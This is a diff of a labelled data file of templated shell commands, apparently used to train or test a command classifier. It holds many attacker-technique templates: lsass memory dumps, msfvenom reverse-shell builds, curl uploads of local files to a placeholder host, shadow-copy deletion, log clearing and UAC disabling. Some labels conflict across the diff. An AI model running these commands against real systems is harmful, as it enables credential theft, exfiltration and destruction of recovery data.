@@ -1,128 +1,128 @@
-1	mail -s ${email_subject} ${username}@${domain} < mail.txt
-1	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
-1	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
-1	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
-1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
-1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
-1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> &1
-1	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> error.log
-1	cat email.txt | mail -s ${email_subject} ${username}@${domain}
-1	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> /dev/null
-1	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> &1
-1	cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> error.log
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> &1
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> error.log
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
-1	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
-1	cat email.txt | mutt -s ${email_subject} ${username}@${domain}
-1	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
-1	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> &1
-1	cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> error.log
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain}
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> &1
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> error.log
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> /dev/null
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> &1
-1	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} -a attachement.txt 2> error.log
-1	cat email.txt | mpack -s ${email_subject} ${username}@${domain}
-1	cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> /dev/null
-1	cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> &1
-1	cat email.txt | mpack -s ${email_subject} ${username}@${domain} 2> error.log
-1	sendmail ${username}@${domain} < mail.txt
-1	sendmail ${username}@${domain} < mail.txt 2> /dev/null
-1	sendmail ${username}@${domain} < mail.txt 2> &1
-1	sendmail ${username}@${domain} < mail.txt 2> error.log
-1	echo ${email_content} | sendmail ${username}@${domain}
-1	echo ${email_content} | sendmail ${username}@${domain} 2> /dev/null
-1	echo ${email_content} | sendmail ${username}@${domain} 2> &1
-1	echo ${email_content} | sendmail ${username}@${domain} 2> error.log
-1	cat email.txt | sendmail ${username}@${domain}
-1	cat email.txt | sendmail ${username}@${domain} 2> /dev/null
-1	cat email.txt | sendmail ${username}@${domain} 2> &1
-1	cat email.txt | sendmail ${username}@${domain} 2> error.log
-1	ssmtp ${username}@${domain} < mail.txt
-1	ssmtp ${username}@${domain} < mail.txt 2> /dev/null
-1	ssmtp ${username}@${domain} < mail.txt 2> &1
-1	ssmtp ${username}@${domain} < mail.txt 2> error.log
-1	echo -e ${email_content} | ssmtp ${username}@${domain}
-1	echo -e ${email_content} | ssmtp ${username}@${domain} 2> /dev/null
-1	echo -e ${email_content} | ssmtp ${username}@${domain} 2> &1
-1	echo -e ${email_content} | ssmtp ${username}@${domain} 2> error.log
-1	cat email.txt | ssmtp ${username}@${domain}
-1	cat email.txt | ssmtp ${username}@${domain} 2> /dev/null
-1	cat email.txt | ssmtp ${username}@${domain} 2> &1
-1	cat email.txt | ssmtp ${username}@${domain} 2> error.log
-1	mailx -s ${email_subject} ${username}@${domain} < mail.txt
-1	mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
-1	mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
-1	mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
-0	psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
-0	powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
-0	powershell -c "certutil -encode -UnicodeText -f error.txt encode.txt"
-0	arp -g
-0	net stop ${service_name}
-0	cmd /c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
-0	cmd /c "taskkill.exe /F /IM ${process_name} /T"
-0	nmap -A ${ip_address} 2> &1
-0	cmd /c "sdelete.exe -accepteula ${local_file_path}"
-0	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
-0	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
-0	rm -fr ${local_file_path}
-0	taskkill /F /IM ${process_name} /T
-0	mstsc /v:${ip_address} /multimon
-0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
-0	cmd /c "wmic os get OSArchitecture"
-0	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
-0	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+1	Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+1	cmd /c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}
+1	cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	powershell -c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+1	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+1	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+1	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+1	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+0	cmd /c "choco install -f Megasync"
+0	powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+0	cmd /c "procdump -accepteula -mm lsass lsassdump.dmp"
+0	powershell -c "sc.exe stop ${service_name}"
+0	powershell -c "sdelete.exe -f -q -accepteula ${local_file_path}"
+0	powershell -c "taskkill.exe /F /im ${process_name}"
+0	cmd /c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
+0	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+0	certutil -encode -f ${source_file_path} ${destination_file_path}
+0	certutil -encode -Unicode -gmt error.txt encode.txt
+0	powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+0	powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+0	msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	arp.exe -a
+0	cmd /c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	powershell -c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+0	wevtutil clear-log security
+0	cmd /c "choco install -f putty"
+0	procdump.exe -ma lsass.exe lsassdump.dmp
+0	cmd /c "mstsc.exe /v:${ip_address} /f /remoteGuard"
+0	powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
+0	cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p${password}"
+0	cmd /c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
+0	cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> error.log
+0	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+0	cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
+0	cmd /c "msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	echo -e ${email_content} | ssmtp ${username}@${domain}
+0	mstsc.exe /v:${ip_address} /f /remoteGuard
 0	7z a -slp ${destination_file_path} ${source_file_path} -p
-0	rm -r ${local_file_path}
-0	cmd /c "sdelete -f -q ${loal_file_path}"
-0	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-0	procdump.exe -mm lsass lsassdump.dmp
-0	powershell -c "sdelete.exe -accepteula ${local_file_path}"
-0	cmd /c "certutil -encode -UnicodeText -gmt -f error.txt encode.txt"
-0	powershell -c "mstsc /v:${ip_address} /f /admin"
-0	7z.exe a -p ${destination_file_path} ${source_file_path}
-0	cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
-0	cmd /c "vssadmin.exe Delete Shadows /All /Quiet"
-0	cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-0	nmap -p- -sV -O ${ip_address} 2> &1
-0	cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
-0	cmd /c "certutil -encode -v error.txt encode.txt"
-0	tasklist
-0	powershell -c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
-0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
-0	cmd /c "del /q ${local_file_path}"
-0	curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
-0	powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
-0	plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-0	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
-0	cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
-0	nmap -sC ${ip_address}
-0	cmd /c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	wmic os get FreePhysicalMemory
-0	cmd /c "choco install -y winscp"
-0	powershell -c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	rmdir /s /q ${local_file_path}
-0	powershell -c "wevtutil cl security"
-0	nmap -p- -sC -sV -O -A ${ip_address} 2> &1
-0	nmap -T5 ${ip_address} 2> /dev/null
-0	7z.exe a -slp -p ${destination_file_path} ${source_file_path}
-0	sdelete.exe -f -q ${local_file_path}
-0	powershell -c "mstsc.exe /v:${ip_address} /multimon"
-0	plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-0	cmd /c "sc.exe stop ${service_name}"
-0	sdelete -f -accepteula ${local_file_path}
-0	Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
-0	choco install -f rclone
-0	powershell -c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
-0	cmd /c "taskkill /f /im ${process_name}"
-0	taskkill.exe /f /im ${process_name}
-0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-0	powershell -c "mstsc.exe /v:${ip_address} /public"
+0	nmap -v ${ip_address}
+0	powershell -c "choco install -f psexec"
+0	cmd /c "choco install -f Megasync"
+0	powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f"
+0	powershell -c "wmic.exe shadowcopy call create Volume=C:"
+0	powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "del /f ${local_file_path}"
+0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
+0	cmd /c "certutil -encode -UnicodeText -gmt error.txt encode.txt"
+0	cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+0	powershell -c "vssadmin.exe delete shadows /all"
+0	cmd /c "choco install -f 7zip"
+0	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+0	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+0	powershell -c "del /q /f ${local_file_path}"
+0	powershell -c "wevtutil cl application"
+0	certutil -encode -UnicodeText -f error.txt encode.txt
+0	powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
+0	powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+0	del /q /p ${local_file_path}
+0	mstsc /v:${ip_address} /f /admin
+0	cmd /c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+0	cmd /c "choco install procdump"
+0	powershell -c "sdelete.exe -s ${local_file_path}"
+0	del /f /p ${local_file_path}
+0	nmap -p- -sC ${ip_address}
+0	mstsc.exe /v:${ip_address} /f /admin
+0	cmd /c "sdelete.exe ${local_file_path}"
+0	sdelete.exe -s -accepteula ${local_file_path}
+0	mail -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
+0	vssadmin Delete Shadows /all
